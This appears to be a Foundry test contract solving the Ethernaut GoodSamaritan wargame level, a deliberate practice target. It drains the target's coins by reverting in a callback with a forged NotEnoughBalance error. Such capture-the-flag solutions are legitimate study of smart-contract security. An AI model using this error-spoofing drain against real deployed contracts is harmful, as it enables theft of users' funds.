// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "test/Ethernaut.t.sol";

interface Level27 {
    function requestDonation() external returns (bool);
    function coin() external view returns (address);
    function wallet() external view returns (address);
}

interface Coin {
    function balances(address) external view returns (uint256);
}

contract Level27Test is EthernautTest {
    error NotEnoughBalance();

    Level27 level27Instance;

    function testLevel27() public {
        _createLevel("27");

        level27Instance = Level27(levelInstance["27"]);

        // The Coin contract initiates a callback to msg.sender
        // We can revert with the error NotEnoughBalance() to
        // cause the GoodSamaritan contract to send us their entire
        // balance
        level27Instance.requestDonation();
        // We need to call a second time to clear the remaining 10 coins
        level27Instance.requestDonation();

        require(_submitLevel("27"));
    }

    function notify(uint256 _amount) external {
        // This is the callback
        // We revert with the NotEnoughBalance error if the
        // coin balance of the wallet is > 10
        // If it is greater than 10, we revert to drain the remaining tokens
        // If it is less than or equal to ten, then it will withdraw the
        // 10 coins
        // This allows us to call requestDonation twice to drain all coins
        if (Coin(level27Instance.coin()).balances(level27Instance.wallet()) > 10) revert NotEnoughBalance();
    }
}
